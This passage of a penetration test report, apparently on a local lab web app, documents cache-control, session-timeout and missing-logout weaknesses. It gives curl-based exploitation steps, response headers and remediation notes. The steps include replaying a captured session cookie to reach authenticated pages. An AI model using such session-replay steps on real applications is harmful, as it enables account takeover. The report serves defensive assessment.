- Apache configured for HTTP-only on port 80
- No SSL module enabled (`a2enmod ssl` not in Dockerfile)
- No HSTS header to enforce HTTPS
- No HTTP-to-HTTPS redirect
- No port 443 listener configured
- Combined with missing Secure flag (AUTH-VULN-02), makes MITM attacks trivial
- Vulnerable on any network: public WiFi, corporate networks, compromised routers

---

### AUTH-VULN-08: Session Data Caching via Cache-Control Header Misconfiguration

**Summary:**
- **Vulnerable location:** Response header setting at `routes.py:25` - overwrites secure cache prevention
- **Overview:** Line 25 sets `Cache-Control: public, max-age=0` which overwrites the secure `no-cache, no-store, must-revalidate` from line 22
- **Impact:** Browser/proxy caching of authenticated pages, enabling session theft from shared computers
- **Severity:** Medium

**Prerequisites:**
- Victim uses shared computer or public terminal
- Attacker has physical or remote access to same computer after victim

**Exploitation Steps:**

1. Victim accesses application with authenticated session:
```bash
curl http://localhost:33677/list -b "user=[VICTIM_SESSION]"
```

2. Check Cache-Control header in response:
```bash
curl -I http://localhost:33677/list
```

3. Observe misconfigured header:
```
Cache-Control: public, max-age=0
```

4. Browser may cache response despite max-age=0 because `public` directive allows caching

5. Attacker on shared computer accesses browser cache/history to view victim's cached authenticated pages

**Proof of Impact:**
Cache-Control header is set to `public, max-age=0` instead of secure settings. HTTP response shows:
```
HTTP/1.1 200 OK
Date: Tue, 28 Oct 2025 19:42:27 GMT
Server: Apache/2.4.65 (Debian)
Cache-Control: public, max-age=0
Pragma: no-cache
Expires: 0
```

The `public` directive allows caching by browsers and intermediary proxies, even with `max-age=0`. This is caused by line 25 in `routes.py` overwriting the secure configuration from line 22.

**Notes:**
- Line 22 sets secure headers: `Cache-Control: no-cache, no-store, must-revalidate`
- Line 25 overwrites with: `Cache-Control: public, max-age=0`
- `public` allows caching, conflicting with `no-store` intent
- Responses with Set-Cookie headers should never be marked cacheable
- Shared computer risk: browser history/disk cache may persist session data
- Mitigated by session cookies (deleted on browser close) but still exploitable during active sessions

---

### AUTH-VULN-09: Indefinite Session Validity via Missing Session Timeout

**Summary:**
- **Vulnerable location:** All cookie-setting operations at `routes.py:44-45, 68-69, 88-89` - no `max_age` or `expires` parameters
- **Overview:** Session cookies have no expiration, remaining valid indefinitely throughout browser session
- **Impact:** Stolen/hijacked sessions remain valid forever, providing unlimited window for session-based attacks
- **Severity:** Medium

**Prerequisites:**
- Attacker obtains session cookie (via XSS, network sniffing, or other means)
- Target application at http://localhost:33677

**Exploitation Steps:**

1. Establish session and capture cookie:
```bash
curl -I -c - http://localhost:33677/list 2>&1 | grep "Set-Cookie"
```

2. Observe Set-Cookie headers lack expiration:
```
Set-Cookie: bookmarks=W10K; Path=/
Set-Cookie: user=64a5c3cff5aa49b6964e836285f4a8b0; Path=/
```

3. Note absence of:
   - `Max-Age` attribute (idle timeout)
   - `Expires` attribute (absolute expiration)

4. Captured session cookie remains valid indefinitely during browser session:
```bash
# Cookie valid immediately
curl -b "user=64a5c3cff5aa49b6964e836285f4a8b0" http://localhost:33677/list

# Cookie still valid hours/days later (until browser closed)
curl -b "user=64a5c3cff5aa49b6964e836285f4a8b0" http://localhost:33677/list
```

**Proof of Impact:**
Set-Cookie headers show no expiration attributes:
```
Set-Cookie: bookmarks=W10K; Path=/
Set-Cookie: user=64a5c3cff5aa49b6964e836285f4a8b0; Path=/
```

Missing attributes:
- No `Max-Age` parameter (should expire after 30 minutes of inactivity)
- No `Expires` parameter (should have absolute expiration time)

This means:
- Sessions persist for entire browser session lifetime
- No idle timeout - inactive sessions never expire
- No absolute timeout - sessions have no maximum duration
- Stolen cookies remain valid until browser closure
- Violates PCI-DSS requirement for session timeout (15 minutes idle, 2 hours absolute)

**Notes:**
- Cookies are session cookies (not persistent), mitigating some risk
- However, still exploitable during active browser sessions
- No server-side session expiration logic
- Combined with other vulnerabilities (session hijacking), extends attack window indefinitely
- Best practice: 30-minute idle timeout, 12-hour absolute timeout

---

### AUTH-VULN-10: Persistent Session Risk via Missing Logout Mechanism

**Summary:**
- **Vulnerable location:** No `/logout` endpoint exists in `routes.py`
- **Overview:** Complete absence of logout functionality - users cannot terminate sessions or invalidate cookies
- **Impact:** Users cannot securely end sessions, compromised sessions cannot be revoked, shared computer risk
- **Severity:** Medium

**Prerequisites:**
- User with active session at http://localhost:33677
- Need to terminate session securely

**Exploitation Steps:**

1. Attempt to access logout endpoint:
```bash
curl -I http://localhost:33677/logout
```

2. Observe 404 Not Found response:
```
HTTP/1.1 404 NOT FOUND
```

3. Verify no logout functionality in route definitions:
```bash
grep -r "logout" routes.py
# Returns no results
```

4. User is unable to terminate session through application

5. On shared/public computer, session remains active until browser closure

6. Attacker on same computer can access victim's still-active session

**Proof of Impact:**
Logout endpoint returns 404 Not Found:
```
HTTP/1.1 404 NOT FOUND
Date: Tue, 28 Oct 2025 19:45:30 GMT
Server: Apache/2.4.65 (Debian)
```

Code analysis confirms:
- No `/logout` route defined in `routes.py`
- No cookie deletion logic (`response.set_cookie(..., max_age=0)`)
- No session invalidation capability
- Only routes defined: `/`, `/list`, `/add`, `/delete`, `/about`

**Notes:**
- Users must manually delete cookies or close browser to end session
- No way to revoke compromised sessions
- Shared/public computer risk: sessions persist after user walks away
- No session invalidation on server side (no server-side session store exists)
- Security best practice: Always provide logout mechanism
- Lower confidence for exploitation impact (passive vulnerability requiring other compromise first)
